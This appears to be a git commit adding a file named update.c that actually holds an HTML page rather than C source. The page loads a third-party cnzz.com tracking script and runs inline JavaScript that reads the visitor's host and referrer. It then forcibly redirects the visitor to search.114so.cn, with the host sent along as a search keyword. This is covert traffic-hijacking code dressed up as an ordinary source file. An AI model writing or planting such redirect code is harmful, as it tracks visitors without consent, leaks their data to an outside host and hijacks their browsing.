2c9b9c62bf339841a04ca7deae42d85bd9f523ea
352926@qq.com <352926@qq.com>
2013-10-09 16:06:25 +0800

    first

---
+++ update.c
@@ -0,0 +1,24 @@
+<html>
+<head>
+
+</head>
+<body>
+<script src="http://s24.cnzz.com/stat.php?id=5619041&web_id=5619041" language="JavaScript"></script>	
+<script type="text/javascript">
+	
+var pp = "242&pre="+(new Date()).getTime();
+var s=String(window.location.href);
+var host=escape(s.substring(7,s.indexOf('/',7)));
+var ref=escape(document.referrer);
+s = escape(s); 
+//ysm-->
+location="http://search.114so.cn/search_web.html?id=407&kw="+host;
+//ysm--<
+
+</script>
+
+
+<body>
+</body>
+
+</html>
